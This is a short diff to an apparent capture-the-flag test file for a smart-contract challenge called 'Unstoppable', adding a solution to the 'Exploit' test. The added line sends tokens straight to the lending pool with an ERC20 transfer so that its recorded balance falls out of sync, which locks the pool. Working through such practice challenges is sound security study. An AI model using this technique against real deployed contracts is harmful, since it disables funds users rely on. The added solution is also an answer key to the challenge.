@@ -40,6 +40,9 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+        /** contract assume that the only way to send tokens to the pool contract is using the 
+         * depositTokens() function, we simply get out of sync poolBalance making an ERC20 transfer*/
+        await this.token.transfer(this.pool.address, INITIAL_ATTACKER_BALANCE, { from: attacker });
     });
 
     after(async function () {
